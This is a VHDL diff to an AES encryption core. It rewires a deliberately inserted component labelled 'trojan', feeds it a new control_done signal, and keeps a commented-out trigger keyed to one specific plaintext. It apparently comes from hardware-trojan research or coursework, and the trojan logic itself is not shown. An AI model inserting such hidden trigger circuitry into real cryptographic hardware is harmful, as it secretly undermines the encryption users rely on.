@@ -30,8 +30,7 @@ entity aes_enc is
 		plaintext : in std_logic_vector(127 downto 0); -- was 127 
 		ciphertext : out std_logic_vector(127 downto 0);
 		--trigger_out : out std_logic;-- Added by me can erase
-		--done : out std_logic
-		done : inout std_logic		
+		done : out std_logic		
 	);
 end aes_enc;
 
@@ -47,6 +46,7 @@ architecture behavioral of aes_enc is
 	signal round_const : std_logic_vector(7 downto 0);
 	signal sel : std_logic;
 	signal trigger : std_logic; -- Added by me
+	signal control_done : std_logic; -- Added by me
 	--signal reg_input1 : std_logic_vector (56 downto 0); -- Added by us
 	--signal reg_input2 : std_logic_vector (70 downto 0); -- Added by us
 	
@@ -57,11 +57,12 @@ begin
 	--reg_input (127 downto 0) <= reg_input1 & reg_input2 when rst = '0' else feedback; -- Added by us to get around multiple driver nets error in implementation
 	-- OLD trigger before actual activations trigger <= '1' when plaintext=x"340737e0a29831318d305a88a8f64332" else '0'; -- Added by me as test case for trojan
     -- Adding trojan component in here
+    -- Could perhaps change this done and the one above to being an output from the controller...
     trojan : entity work.trojan
         Port map (
         Clock => rst,
         Reset_A => clk,
-        Reset_B => done,
+        Reset_B => control_done,
         plaintext => plaintext,
         trigger => trigger
         );
@@ -106,7 +107,8 @@ begin
 			rst            => rst,
 			rconst         => round_const,
 			is_final_round => sel,
-			done           => done
+			done           => done,
+			control_done => control_done
 		);
 	-- Keyschedule
 	key_schedule_inst : entity work.key_schedule
